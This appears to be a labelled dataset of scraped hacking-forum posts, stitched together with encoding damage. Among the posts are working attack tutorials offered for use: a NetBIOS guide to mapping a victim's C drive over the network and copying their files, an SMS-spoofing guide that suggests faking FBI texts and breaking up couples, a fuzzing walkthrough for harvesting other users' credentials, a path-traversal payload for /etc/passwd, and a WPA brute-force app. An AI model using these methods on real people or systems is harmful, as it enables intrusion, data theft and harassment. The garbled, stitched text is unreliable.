real hackers, although they can use XSS vulnerabilities to help trick people. People also get trojans from opening email extensions and downloading pirate stuff off p2p without a decent antivirus. Hackers with skills enough to find open ports / exploit them and get shell access are much more rare than people claim.  Common Types of Webhacks   SQL InjectionBy far the most common serious error web programmers have is not validating user input well. Usually SQL injections are used to get username / passwords or other information in the database by adding a UNION statement to a select query. Despite its name its more rare to get an exploit where you can actually inject or insert data into the database since most programmers arent stupid enough to use GET requests for insert, most hackers are more lazy when it comes to spoofing post requests, and its a lot more tricky or impossible to add insert, create or drop queries to injected strings.Local File InclusionMany web apps load modules or plugins through get or post variables. Lets say I use ?loadplz=file.php if I wanted to load /home/jimmy/htdocs/file.php a malicious person could say ?loadplz=../../../../../../../../../etc/passwd to try his luck for some unshadowed password goodness. Many times the NULL byte exploit is used to trick input validation. It is often used to include any CMS or Forum configuration files to get MySQL access.Remote File InclusionYikes, a lot of web apps have forms where you can upload pictures, texts or files Some have admin control panels that only the admin of the site can access but then theres no input validation on the upload forms. Some just dont validate the type of file you upload, meaning you can upload malicious code that does anything within the limits of the JIT compiler privileges.Logged in User ExploitsMany sites often dont validate the data you want to modify or delete is yours. They only check if youre logged in. Sites that use Ajax are especially prone to overlook possible input validation problems. How are passwords stored in a website   Most are stored as md5 hashes. If your password is stored without encryption you are screwed if the site gets hacked. It doesnt matter how long your password is. Sites like thepiratebay and stage6 have gotten their passwords stolen, dont think it cant happen to big sites. You can tell if a site encrypts your password by using their password recovery form. If it gives you your password your password is not encrypted. If it asks you to enter a new one or it generates a password for you, it has your password encrypted. You should never purchase anything from sites that dont encrypt your password, they may keep your credit card information or other sensitive data without encryption following their php for dummies guide  Dangers of md5   Sites like milw0rm and plain-text have millions, maybe billions of precomputed hash values in what are called  rainbow tables . People can enter hashes in limited quantities to put on queue for cracking. md5 is a one-way hash, meaning it cant be decrypted. Instead, they try every possible combination in a limited range. Encrypting many possibilities and comparing them to the original hash is extremely slow. Rainbow tables make it so that the possibilities are encrypted only once and the resulting hashes are saved into massive files called a Rainbow table. From there the real hashes are compared to all the possibility hashes in the rainbow table. This avoids recalculating the hashes for every possibility for every user but in exchange costs a lot of overhead loading the file into memory and comparing from memory. The time-memory trade off is worth it. Other sites are just searchable databases of hashes. You still should be ok if your pass is over 8 characters long. Some sites do double md5s or concatenate md5 encrypted passwords with an encrypted \""salted\"" value, then encrypt the whole thing again. Because the salted value is different for each user, precalculating millions of hashes in rainbow tables would have to be done one user at a time, making it a worse option that brute forcing it. Brute force attacks use word lists separated by line breaks which are widely available around the net and can be easily created, they can also check all possible combinations for certain ranges and character sets. Making your password case sensitive helps exponentially, specifically ^+26 lol, but it makes typing a pass a bit more inconvenient and not all sites support it. Im sure my prog isnt the most efficient possible and there are way faster comps out there so be careful.  Web Exploiters vs Program Crackers   People who exploit website vulnerabilities are not always the same as those who crack and keygen commercial software and games. The two require a few different skill sets. Web hacking requires mastery knowledge of the http protocol, cookies, php, asp, SQL, and the methods user input is usually validated. The skill is gained from a lot of practice writing safe web-apps and observing the exploits found often in others. Program crackers on the other hand usually have very intimate knowledge of assembly and non-JIT compilers. They use a debuggers to find exactly where in the program a certain procedure is executed in order to modify it. They are also apt in modifying and exploiting unvalidated user input in the memory with buffer overflows. Browser plugins are often the target to buffer overflow exploits. Im not saying some people dont have both skill sets.  What is hacking   Contrary to popular belief and the Hollywood culture, hackers are just people that can manipulate things on a bits and bytes level. Theyre excellent programmers and the majority do not engage in illegal activity. Making something do what it wasnt intended to is exploiting, not hacking. """
0	Spoofing text messages and spamming cell phones	"""   I actually took the time to make this (except for the list of carriers). I hope everyone else has as much fun as I have had doing this!   You can spoof and/or spam any cell number with any ordinary php mailer. And you can spoof it to say it was from the FBI (not recommended) or some other phone number. Keep in mind this is a very powerful thing. You can even break boyfriends/girfriends relations apart (just an idea). Or you can scare people with FBI texts.    Use this php mailer i made for this tutorial:   Code: http://voide.zendfree.com/   What you need to know:   1. knowledge of victims cell carrier   So first once you got your mailer you fill out all

This tutorial was Written by EKK13, For Security-Sh3ll.  u may copy this tutorial but please respect my credits. ************************ Begin: ******* I assume youve allready got Acunetix wvs on ur system. Run Acunetix wvx, select HTTP Sniffer and Let it start by clicking on start (duh) next we must configure FireFox (i love that fox lol ) click in firefox on Extra -> Options click on Advanced then Manually Configuration by HTTP-proxy you typ Localhost at port 8080. Now we go to the Login panel of the site you want to hack. To understand how the Authentication works, so we must register an account on the target site. and login... Now youre logged in, you go to Acunetix wvs. in Acunetix we see that the HTTP-Sniffer logged the Login session, from here we can get a better idea of how it works. Notice how Userid is logged, from here it can Modifyed to an other user id. ( Dont do That ) Now Right Click on the Request and select Send to HTTP-Fuzzer now in HTTP-Fuzzer we can add a number Generator. Click Add Generator  -> Number Generator  this will be used to generate a different userid. by name you set userids by start number you set 100000 and stop number you set 999999 Now select the Userid in the Request log, dan click Insert into Request then simple Start wait a Few minutes, after that we see all the userids of the site. The Attacker can now proceed to search for his Victim. by Viewing the HTML Code we can now look for the userids and passwords, wich would  be normally hidden under the website. **************** Notice: Many people use the same password on different sites. like hotmail etc. this will not work on Every site, only with Broken Authentications. """
0	Hacking Into a Computer [With Pictures]	""" [SIZE=\""3\""] NetBIOS Hacking -What is it?- NetBIOS Hacking is the art of hacking into someone elseÃ¢â¬â¢s computer through your computer. NetBIOS stands for Ã¢â¬ÅNetwork Basic Input Output System.Ã¢â¬Â It is a way for a LAN or WAN to share folders, files, drives, and printers. -How can this be of use to me?- Most people donÃ¢â¬â¢t even know, but when theyÃ¢â¬â¢re on a LAN or WAN they could possibly have their entire hard drive shared and not even know. So if we can find a way into the network, their computer is at our disposal. -What do I need?- Windows OS Cain and Abel ( oxid.it - Home ) ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++ -[Step 1, Finding the target.]- ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++ So first off we need to find a computer or the computer to hack into. So if your plugged in to the LAN, or connected to the WAN, you can begin. Open up Cain and Abel. This program has a built in sniffer feature. A sniffer looks for all IP addresses in the local subnet. Once you have opened up the program click on the sniffer tab, click the Start/Stop sniffer, and then click the blue cross Another window will pop up, make sure Ã¢â¬ÅAll host in my subnetÃ¢â¬Â is selected, and then click ok. It should begin to scan. Then IPÃ¢â¬â¢s, computer names, and mac addresses will show up.  Now remember the IP address of the computer you are going to be breaking into.  If you canÃ¢â¬â¢t tell whether the IP address is a computer, router, modem, etc, thatÃ¢â¬â¢s ok.  During the next step we will begin our trial and error. ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++ -[Part 2, Trial and Error]- ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++ Now, we donÃ¢â¬â¢t know if we have our designated target, or if we have a computer or printer, or whatever else is on the LAN or WAN.  If you did get the IP of the target though, I still recommend reading through this section, for it could be helpful later on.  Click on the start menu and go to run, type in cmd, and click ok.  This should bring up the command prompt.  From here we will do most of the hacking.  Now I will be referring to certain commands that need to be inputted into the command prompt.  I will put these commands in quotes, but do not put the quotes in the code when you type it into the prompt.  I am only doing this to avoid confusion.  LetÃ¢â¬â¢s get back to the hacking.  Type in Ã¢â¬Åping (IP address of the target).Ã¢â¬Â For example in this tutorial, Ã¢â¬Åping 192.168.1.103.Ã¢â¬Â  This will tell us if the target is online.  If it worked, it will look something like this (note, I have colored out private information): IF it didnÃ¢â¬â¢t work, meaning that the target is not online, it will look something like this: If the target is not online, either switch to a different target, or try another time. If the target is online, then we can proceed. ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++ -[Part 3, Gathering the Information.]- ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++ Now, input this command Ã¢â¬Ånbtstat Ã¢â¬âa (IP address of target).Ã¢â¬Â An example would be Ã¢â¬Ånbtstat Ã¢â¬âa 192.168.1.103.Ã¢â¬Â  This will show us if there is file sharing enabled, and if there is, it will give us the: currently logged on user, workgroup, and computer name. Ok, youÃ¢â¬â¢re probably wondering, Ã¢â¬ÅWhat does all this mean to me?Ã¢â¬Â Well, this is actually very important, without this, the hack would not work. So, let me break it down from the top to bottom. I will just give the first line of information, and then explain the paragraph that follows it. The information right below the original command says: Ã¢â¬ÅLocal Area Connection,Ã¢â¬Â this information tells us about our connection through the LAN, and in my case, I am not connected through LAN, so the host is not found, and there is no IP. The information right below the Ã¢â¬ÅLocal Area Connection,Ã¢â¬Â is Ã¢â¬ÅWireless Network Connection 2:Ã¢â¬Â It gives us information about the connection to the target through WAN. In my case I am connected through the WAN, so it was able to find the Node IpAddress. The Node IpAddress is the local area IP of the computer you are going to break into. The NetBIOS Remote Machine Name Table, give us the workgroup of our computer, tells us if it is shared, and gives us the computer name. Sometimes it will even give us the currently logged on user, but in my case, it didnÃ¢â¬â¢t. BATGIRL is the name of the computer I am trying to connect to. If you look to the right you should see a <20>. This means that file sharing is enabled on BATGIRL. If there was not a <20> to the right of the Name, then you have reached a dead end and need to go find another IP, or quit for now. Below BATGIRL is the computers workgroup, SUPERHEROES. If you are confused about which one is the workgroup, and the computer, look under the Type category to the right of the < > for every Name. If it says UNIQUE, it is one system, such as a printer or computer. If it is GROUP, then it is the workgroup ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++ -[Step 4, Breaking In]- ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++ Finally itÃ¢â¬â¢s time. By now we know: that our target is online, our target has file sharing, and our targetÃ¢â¬â¢s computer name.  So itÃ¢â¬â¢s time to break in.  We will now locate the shared drives, folders, files, or printers. Type in Ã¢â¬Ånet view \\\\(IP Address of Target)Ã¢â¬Â An example for this tutorial would be: Ã¢â¬Ånet view \\\\192.168.1.103Ã¢â¬Â We have our just found our share name. In this case, under the share name is Ã¢â¬ÅC,Ã¢â¬Â meaning that the only shared thing on the computer is C. Then to the right, under Type, it says Ã¢â¬ÅDisk.Ã¢â¬Â This means that it is the actual C DISK of the computer. The C DISK can sometimes be an entire personÃ¢â¬â¢s hard drive. Alls that is left to do is Ã¢â¬ÅmapÃ¢â¬Â the shared drive onto our computer. This means that we will make a drive on our computer, and all the contents of the targets computer can be accessed through our created network drive. Type in Ã¢â¬Ånet use K: \\\\(IP Address of Target)\\(Shared Drive). For my example in this tutorial, Ã¢â¬Ånet use K: \\\\192.168.1.103\\C.Ã¢â¬Â Ok, letÃ¢â¬â¢s say that you plan on doing this again to a different person, do u see the Ã¢â¬ÅK after Ã¢â¬Ånet use?Ã¢â¬Â This is the letter of the drive that you are making on your computer. It can be any letter you wish, as long as the same letter is not in use by your computer. So it could be Ã¢â¬Ånet use G...,Ã¢â¬Â for a different target. As you can see, for my hack I have already used Ã¢â¬ÅK,Ã¢â¬Â so I used Ã¢â¬ÅGÃ¢â¬Â instead.  You may also do the same for multiple hacks.  If it worked, it will say Ã¢â¬ÅThe command completed successfully.Ã¢â¬Â  If not, you will have to go retrace you steps.  Now open up Ã¢â¬Åmy computerÃ¢â¬Â under the start menu, and your newly created network drive should be there. Now, if you disconnect from the WAN or LAN, you will not be able to access this drive, hence the name Network Drive.  The drive will not be deleted after you disconnect though, but you wonÃ¢â¬â¢t be able to access it until you reconnect to the network.  So if you are doing this for the content of the drive, I recommend dragging the files and folders inside of the drive onto your computer,  because you never know if the target changes the sharing setting.  If you are just doing this to hack something, then go explore it and have some well deserved fun! Congratulations! YouÃ¢â¬â¢re DONE! -Commands used in this tutorial: PING NBTSTAT -a (IP Address of Target) NET VIEW \\\\(IP Address of Target) NET USE K: \\\\(IP Address of Target)\\(SHARENAME) [/SIZE] """
1	Apple iOS v7.1.2 - Merge Apps Service Local Bypass Vulnerability	"""   Document Title: =============== Apple iOS v7.1.2 - Merge Apps Service Local Bypass Vulnerability Product & Service Introduction: =============================== iOS (previously iPhone OS) is a mobile operating system developed and distributed by Apple Inc. Originally released in 2007 for  the  iPhone and iPod Touch, it has been extended to support other Apple  devices such as the iPad and Apple TV. Unlike Microsoft`s  Windows Phone (Windows CE) and Google`s Android, Apple does not license iOS for installation on non-Apple hardware. As of  September  12, 2012, Apple`s App Store contained more than 700,000 iOS  applications, which have collectively been downloaded more  than  30 billion times. It had a 14.9% share of the smartphone mobile  operating system units shipped in the third quarter of 2012,  behind only Google`s Android. In June 2012, it accounted for 65% of mobile web data consumption (including use on both the iPod  Touch  and the iPad). At the half of 2012, there were 410 million devices  activated. According to the special media event held by  Apple on September 12, 2012, 400 million devices have been sold through June 2012. The  user interface of iOS is based on the concept of direct manipulation,  using multi-touch gestures. Interface control elements  consist  of sliders, switches, and buttons. Interaction with the OS includes  gestures such as swipe, tap, pinch, and reverse pinch,  all of which have specific definitions within the context of the iOS operating system and its multi-touch interface. Internal  accelerometers  are used by some applications to respond to shaking the device (one  common result is the undo command) or rotating  it in three dimensions (one common result is switching from portrait to landscape mode). iOS  is derived from OS X, with which it shares the Darwin foundation. iOS  is Apple`s mobile version of the OS X operating system  used on Apple computers. In  iOS, there are four abstraction layers: the Core OS layer, the Core  Services layer, the Media layer, and the Cocoa Touch layer.  The current version of the operating system (iOS 6.1) dedicates 1-1.5 GB of the device`s flash memory for the system partition,  using  roughly 800 MB of that partition (varying by model) for iOS itself. iOS  currently runs on iPhone, Apple TV, iPod Touch, and iPad. ( Copy of the Homepage:  Hidden Content:  You must reply to see links  ) Affected Product(s): ==================== Apple Product: iOS - Mobile Device System 7.1.2 (11D257) Technical Details & Description: ================================ A local pass code (code lock) bypass has been discovered in the Apple (iPhone) iOS v7.1.2 (11D257) mobile device system. The vulnerability allows to bypass via evade or glitch the local pass code service of iOS to compromise the mobile device. The local bypass vulnerability is located in the pass code module of the Apple iOS v7.1.2. Local attackers with physical  access can merge local installed apps and default services via glitch ahead to the pass code module of the apple iphone device. Regular the security policy of the device disallows to merge services ahead to the logon screen (pass code). Local attackers without restricted physcial account can merge apps with functions ahead to the pass code module to compromise  the device. Local attackers with user account can prepare (manipulate) a mobile device to access later the restricted context. During the tests we revealed that the exploitation is only possible (merge apps ahead to pass code) when the siri edit command  context has been involved to save temporarily context. If  the exploitaiton through the glitch was successful the attacker is able  to prepare calls via app, write emails or access other  last used apps to compromise the iOS device. The security risk of the local pass code bypass vulnerability is estimated as medium with a cvss (common vulnerability scoring  system) count of 5.9. Exploitation of the local glitch bypass vulnerability requires a privileged web-application user account,  multi  user account or restricted physical device access without user  interaction. Successful exploitation of the local pass code  bypass vulnerability results in device compromise or information leaking. Affected Device(s):       [+] Apple > iPhone 5s Affected OS Version(s):       [+] iOS v7.1.2 - 11D257 Tested Device(s):       [+] Apple iPhone 5s > iOS 11D257 Proof of Concept (PoC): ======================= The  local pass code bypass vulnerability can be exploited by local  attackers with privileged device user account without user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue. Manual steps to reproduce the issue ... 1. Login to your iPhone device and update it to the newst iOS version (7.1.2 - 11D257) 2. Go to settings > Code (Code Lock Settings) and ensure siri service is activated (service activated by default) 3. Lock the iphone or ipad by usage of the power button, slide the to the pass code 4. Press the siri button 2 seconds and in the last second the emergency call button too  Note: The siri opens and the emergency call site is in the background. It is not allowed to use siri in the emergency call mask! 5. Start siri in the locked iphone/ipad mode 6. Use the command \""Open/Call Contact Hacker A A\"" Note: The contact you call needs more then 3 entries with the same letter to be saved 7. In our tests it opens after the command the siri mask and shows us the visible contacts of the phone with the same name 8. Go on top of the mask were the user is able to edit manually the input of the command 9. Click to Edit the input field of the siri command on top and save the all the input temporarily 10. Now we press 3 seconds the power button and in the third second we press also the \""Others (Contacts)\"" button Note: The contact button allowed in the last version to access the addressbook but the issue is patched yet 11. Now we hold the home and siri button together and stop holding the power button same time 12.  The website with the temp saved content allows to move modules ahead to  the logon mask with represents a stable security risk Note: The policy disallows to use any function ahead to the pass code (lock-screen) of iOS devices Case Scenario: During  the security test we used the new iphone 5s of a lab member in our  office to verify. We included the messages, face-time and  mail  service in front on top of the iOS login mask. The local attacker is  able to save through the evil glitch any program which is  available at the phone ahead to the login screen (pass code) module. At the end we made jokes by writing messages ahead to the  phone pass code (lock screen) module. The glitch has been reproduced when the watch of the login screen becomes visible in all  backgrounds of the used app.   """
2	Hackers beware: A Crook is Caught One Day or the other	""" Hackers beware: A Crook is Caught One Day or the other Hackers had broken into the Department of Defenses computers - again. With news like this, combined with the fact that other hackers are constantly seeking to steal peoples identity, send out spam from innocent computers, and other computer crimes hacking into unauthorized places, makes it necessary for illegal hackers to be caught. If you are one of those who have suffered from a hack attack, then you may be one of those who say: \""I need an IP specialist, to catch a hacker.\"" This article will show you some things that you can do. How Hackers Are Caught With the fact that Microsoft and some other software companies have been notified - yes, by hackers, that there are many \""holes\"" in Windows that a hacker can take advantage of. Microsoft has responded by attempting to fix the \""holes\"" each time one is pointed out. Then, it sends out a patch to block hackers from attacking through that \""hole.\"" Keeping up with the updates from Microsoft is one way to close down the problems that exist in the Windows software - though it is unknown if all such \""holes\"" will ever be known. Normally, it is rather hard to notice that a hacker has hacked into your computer. If all he is doing is having a look around, or taking minimum amounts of data - you really cannot be sure that you are being hacked. The are some effects of computer hacking, though, that might tip you off. Here are a couple of ways to detect hackers. Detecting Hackers Hackers, by nature are very stealthy. Their ability to gain access to your computer through the Internet can easily be done without your knowledge - and most of them seem to prefer that approach. Before time is spent on being able to detect a hacker, it should be noted that a determined hacker will not be stopped! They will get in - even to the Department of Defenses systems! Some common things that might tip you off to an intrusion are:     * Lights showing hard drive activity being busier than what your own activities call for     * Suspicious files left on your computer - often in the Windows Temp directory with a tmp. suffix     * Obvious tampering - destroyed files, missing files, etc.     * Or, the worst case - someones taking money out of your bank account or using your credit cards (Please note, though, that this could also be the result of phishing, too - not necessarily hacking)     * Your firewall keeps receives multiple packets from a single web address and notifies you. """

1	Jailbreak iOS 8.0 , 8.1 with Pangu	"""   Jailbreak iOS 8.0 , 8.1 with Pangu    The jailbreak is compatible with all devices running iOS8.0-iOS8.1 Special Note 1. Why did Cydia Because of the many changes in iOS8 system, Cydia and dependence  Substrate framework of many plug-ins are not available in iOS8. So we  provide developers require some basic environmental and SSH and other  plug-in version 1.0 jailbreak, the convenience Cydia author and other  developers can quickly modify their code against iOS8. After the  completion of compatible Cydia, we will release updates to integrate  Cydia. So Pangu jailbreak (iOS8) version 1.0 is ready for strict  jailbreak developer version. 2. Should now jailbreak Due to the existence of life-cycle jailbreak, Apple can not know when it  will block loopholes. So you can first escape, and so after the  completion of compatible Cydia, you can download and install Cydia on  the phone by Pangu APP, or by other ways SSH can also be installed. In  addition, PP assistant jailbreak version is also perfectly compatible  with iOS8 system to facilitate user to download and install software. Set Brush features, ultra-fast experience We integrate Brush function, safe, fast and efficient experience Brush a  key, simply select the firmware, click on a button to brush machine,  brush machine to complete, whether you are a novice or brush up white  people, can be easy to get.

1	SEANux Ã¢â¬â A Version Of Linux From The Syrian Electronic Army	""" [ATTACH=CONFIG]196[/ATTACH] Lots of Linux distributions are offered free of cost on the Internet by a number of companies, non-commercial organizations and by many individuals as well, and now, the notorious Syrian Electronic Army (SEA) has announced their own Linux distribution known as SEANux. A Linux distribution is a coordinated collection of software consisting of a customized version of the kernel together with hundreds of open source (i.e., free) utilities, installers, programming languages and application programs. Some of the most popular distributions are Fedora (formerly Red Hat), SuSE, Debian, Ubuntu, Kali Linux, Tails OS and Mint Linux. SEA (Syrian Electronic Army) is the same group of hackers who made the headlines in past year by launching advance phishing attacks against media organisations, usually Western media outlets.   The group is reportedly aligned with president Bashar al-Assad and had purposely targeted social media accounts of a number of high-profile media outlets including The Guardian, The Washington Post, The New York Times, Forbes, CNN, the Financial Times and the AP. They donÃ¢â¬â¢t even left Obama, Facebook, Microsoft, eBay and PayPal from being a victim of their Phishing attack. At this moment, SEA team has not provided any further information regarding their SEANux operating system, but considering their past activities, itÃ¢â¬â¢s hard to trust an operating system released by the SEA hackers group. SEANux slogan says Ã¢â¬ÅPower Up.. Your Performance.Ã¢â¬Â Now the question rises that what kind of performance they actually want to point out. Is that Power up your system performance? or Power up your hacking skills? or Power up your Social Engineering tactics? as most of their targets included social media sites. But, at this moment we can only assume, until they release more details on it. If I talk generally, in our community, i.e. Infosec community, we majorly have three types of Operating System distributions, as follows: Linux OS for Penetration testing and Hacking - like Backtrack or Kali Linux which comes wrapped with a collection of penetration testing and network monitoring tools used for testing of software privacy and security. Forensic OS - Operating System which comes with pre-installed digital forensic tools for testing and security purpose. An Anonymous OS - Operating Systems like Tails which keeps it users tracks clear. Tails provides users anonymity and privacy, and was reportedly used by the Global surveillance Whistleblower Edward Snowden in discussions with journalists because it includes a range of tools for protecting your data by means of strong encryption. We are expecting Ã¢â¬ÅSEANuxÃ¢â¬Â to be a mixture of Tails and Kali Linux, with lots of pre-installed hacking and Privacy tools. But I would doubt about the integrity of this new operating system SEANux - Linux distribution from the SEA, until we get a clean chit from the Infosec community after its release. It wouldnt be a shock or a surprise if SEANux comes with a few backdoors or some privacy concerning malwares hidden in it. As in 2012, Anonymous groups of hackers released an operating system called ANonymous-OS, which was later found to be as a backdoored  Operating System. So, we recommend you to install this Operating System only on a virtual OS, so that your important credentials and data remains on a safer side. """
0	Best Tweaks for iOS 8 Cydia You Should Install Right Now	"""   The iOS 8 jailbreak is officially out and available for all iPhones and iPads that are capable of running iOS 8. Here are five that iOS 8 Cydia tweaks that work with the latest version of iOS that you should install right now. The Pangu dev team is responsible for this latest jailbreak and they’re a recent addition to the jailbreak community, first breaking into the scene with their iOS 7.1.2 jailbreak back in June shortly after the update released from Apple. The iOS 8 jailbreak technically released earlier last month, but since it was a very early release and it didn’t even include Cydia, it was deemed merely a developer release so that tweak devs could get their apps and tweaks working for iOS 8. It actually wasn’t until just recently when the iOS 8 jailbreak became stable enough for public consumption. However, the iOS 8 jailbreak is now stable enough for regular users to install, and while Cydia is now updated for iOS 8, there are still a few kinks that need worked out, most notably the inability download and install paid tweaks, but that should be fixed in no time. Here are five iOS 8 Cydia tweaks that are compatible with iOS 8 jailbroken devices and are worth a download. SwipeSelection iOS’s default method for moving around the cursor in a block of text isn’t exactly the best way that it could be done; you have to tap and hold down, and then you can slide your finger to where you want the cursor to go. An easier way would be to just slide your finger across the keyboard and have the cursor move with it, and your finger wouldn’t be blocking the cursor either.   Luckily, this is exactly what SwipeSelection does, and it’s an absolute Godsend if you type a lot on your iPhone or iPad. There’s also SwipeSelection Pro, which comes with a settings menu where you can customize the cursor speed and such, but the basic version is good enough for most users. F.lux F.lux is always one of the first jailbreak tweaks I install. It essentially gets rid of that nasty blue hue that your screen emits in favor of a warmer color temperature. This assures that you don’t get eye strain. F.lux is also available for OS X and Windows (but not Android, sadly), and I’d highly recommend getting it for your computer if you spend most of the day looking at your computer monitor; it works wonders. ShowCase The one great thing about the Android keyboard is that it shows lowercase letters when typing in lowercase, and uppercase letters when typing in uppercase. However, on iOS, the keyboard shows uppercase letters all the time. A simple jailbreak tweak called ShowCase solves this problem and shows lowercase letters when typing in lowercase, which quickly allows you to see which case you’re typing in without having to look at the Shift key. ShowCase is a fairly trivial jailbreak tweak, but it’s one that I don’t recommend taking for granted, as it makes your typing experience a lot quicker and easier. FlipControlCenter Another jailbreak tweak that’s worth having on your iOS 8 device comes with the ability to customize the Control Center. It’s called FlipControlCenter and it lets you do just that, to an extent. It doesn’t include as much customization as we’d like, but it’s a great start. You can switch around connectivity toggles, as well as the bottom app shortcuts. Plus, you can add on pages that you can swipe through to add even more toggles and shortcuts to Control Center. FlipControlCenter isn’t available in the default Cydia sources, so you’ll have to add a new repo to Cydia in order to get the tweak ( Hidden Content:  You must reply to see links ). To do that, open up Cydia and tap on the  Manage  tab. Then navigate to  Sources > Edit > Add  and type in that repo web address. Activator Activator is pretty much a must when it comes to the iOS 8 Cydia tweaks that you download, as it lets you do so much with your jailbroken device. For example, you can set up shortcuts for just about anything, like activating the LED flashlight with a triple-click of the Home button, or activate Siri using another button instead of having to hold down the Home button. The possibilities are pretty much endless with Activator and we’re glad it’s one of the initial apps to get iOS 8 support. """

1	WIBR Plus Wifi BRuteforce Hack Pro	"""   WIBR  is application for testing of security of the WPA/WPA2 PSK  WiFi  networks. This application is NOT FAKE, it really works and it is   possible to access the WiFi network if it uses weak password. Read  whole  description before using.  Dictionary test - it tries passwords from predefined list one by one.   Please dont be disappointed if the password will not be found, it   simply means that it was not in the dictionary. However, if somebody set   his key to \""12345678\"" or \""password\"" it will be detected. Its easy as 1-2-3. 1) List available networks and select desired network. WIBR is tested on   WPA/WPA2 networks with pre-shared key (PSK). Please note, that the   testing will be unreliable if the signal is weak! WARNING: HACKING   SOMEBODY ELSES WIFI IS ILLEGAL! USE THIS APP ONLY ON YOUR OWN NETWORKS! 2) Select desired dictionaries . There are three predefined wordlist   which you can use. They contains a list of most commonly used passwords.   Please note, that for WPA passwords the minimum length is 8 characters   and shorter passwords will be skipped. 3) Wait for results. The process is very slow due to nature of the WiFi   connection handling in Android, so be prepared that it can take a   loooooooong time. 8 passwords/minute is considered good speed. The wifi   have to be enabled all the time, so WIBR is also battery eater! NOTES WIBR will change password for the selected network. It is impossible to   get this password back. If you are testing previously saved network  then  the password will be lost. WIBR will not work on other encryptions than WPA/WPA2. if it doesnt work: - you are trying to test network with weak or unstable signal or in very   \""noisy\"" environment (i.e. many networks on same channel) - you are trying to access network which is using so called MAC   filtering, so only explicitly allowed devices could access the network  The solution is to try WIBR on another network with good signal.

Ill start by  saying this tutorial is so long Ill break it into parts. Follow each  step accordingly to benefit the most. I also did not make this tutorial I am merely posting to share the  knowledge, I would give credit to who first posted this, but the forum  it was on got taken down and I did not get the name of the author. The Ultimate Guide for Anonymous and Secure Internet Usage v1.0.1 Table of Contents: 1. Obtaining Tor Browser 2. Using and Testing Tor Browser for the first time 3. Securing Your Hard Drive 4. Setting up TrueCrypt, Encrypted Hidden Volumes 5. Testing TrueCrypt Volumes 6. Securing your Hard Disk 7. Temporarily Securing Your Disk, Shredding Free Space 8. Installing VirtualBox 9. Installing a Firewall 10. Firewall Configuration 11. Installing Ubuntu 12. Ubuntu Initial Setup 13. Installing Guest Additions 14. Installing IRC (Optional) 15. Installing Torchat (Optional) 16. Creating TOR-Only Internet Environment 17. General Daily Usage By the time you are finished reading and implementing this guide, you  will be able to securely and anonymously browse any website and to do so  anonymously. No one not even your ISP or a government agent will be  able to see what you are doing online. If privacy and anonymity is  important to you, then you owe it to yourself to follow the instructions  that are presented here. In order to prepare this guide for you, I have used a computer that is  running Windows Vista. This guide will work equally well for other  versions of Windows. If you use a different operating system, you may  need to have someone fluent in that operating system guide you through  this process. However, most parts of the process are easily duplicated  in other operating systems. I have written this guide to be as newbie friendly as possible. Every  step is fully detailed and explained. I have tried to keep instructions  explicit as possible. This way, so long as you patiently follow each  step, you will be just fine. In this guide from time to time you will be  instructed to go to certain URLs to download files. You do NOT need TOR  to get these files, and using TOR (while possible) will make these  downloads very slow. This guide may appear overwhelming. Every single  step is explained thoroughly and it is just a matter of following along  until you are done. Once you are finished, you will have a very secure  setup and it will be well worth the effort. Even though the guide  appears huge, this whole process should take at the most a few hours.  You can finish it in phases over the course of several days. It is highly recommended that you close *ALL* applications running on your computer before starting. 1: Obtaining Tor Browser The first step to becoming secure and anonymous online is to setup and  install something called \""TOR\"". \""TOR\"" is short for Onion Router\"". The  concepts behind TOR were first implemented by the United States  Military, and these principles have been used to create an extremely  secure mechanism for being anonymous online. In fact, millions of people  world-wide use TOR to browse the internet and communicate anonymously. TOR works by heavily encrypting your communications so that no observer  can see what website you are really going to, and what information is  really being sent. It all appears as a bunch of random characters to any  observer. You simply use the TOR web browser just as you use any other  web browser. TOR takes care of the rest. However, TOR by itself is not enough. Even when using TOR, a user can be  compromised in a number of ways. First, some websites can be set up to  attempt to reveal someones true IP address (their true identity) by  tricking their web browser or other software to transmitting that  information. For this reason, anyone who uses TOR will recommend that no  one have javascript or flash turned on while browsing TOR. In this  guide however, I will show you a much better solution. The second issue is that of human error. Even if you have TOR installed,  you may accidentally forget which browser to put in a link. You may  also accidentally click on a link from another program, such as a chat  program. That program might then load the link you clicked on into a  non-TOR browser. When you are using TOR, you must be careful  *constantly* that every link goes into the right browser, and that you  do not accidentally click the wrong link. So then, lets begin. Obtaining the TOR Browser is easy. Simply go to the following website:  Hidden Content:  You must reply to see links Once here, you may feel free to read more about what TOR is and how it works, or you may proceed to immediately download TOR. Here is how to do so: 1. Click on \""Download TOR\"", or \""Download\"". 2. You will see text that says, \""The Tor Browser Bundle contains  everything you ned ... Just extract it and run. Learn more >> 3. Click on this \""Learn more\"" link. for the \""Tor Browser Bundle\"" 4. Assuming you are an English speaker, you would choose the top-most  link \""English (en-US)\"". Otherwise, pick the language best suited to you. 5. The file being saved will be named: tor-browser-1.3.18_en-US.exe It is ok if the number is not exactly 1.3.18, there are new versions of  Tor from time to time. At the time that this guide was written, 1.3.18  was most current. By the time you are reading this, a more current  version of TOR may exist. 6. Run this file. 7. You will be prompted to extract this to a directory. By default, it  will be set to C:\\Users\\You\\Downloads\\ This is perfectly ok. You can  also choose a different directory if you wish. 8. Click \""Extract\"" Thats it. TOR Browser is NOW installed. Time to test it out! 2 : Using and Testing Tor Browser for the first time Now you have successfully downloaded and installed the Tor Web Browser  Bundle. You are no doubt anxious to begin using it. First, click on the  \""start\"" menu icon, the icon in the lower left of your screen with the  windows logo. On the top right will be a listing that says \""You\"",  \""Documents\"", \""Pictures\"", \""Music\""... \""You\"" of course will be replaced by  your user name. Click on 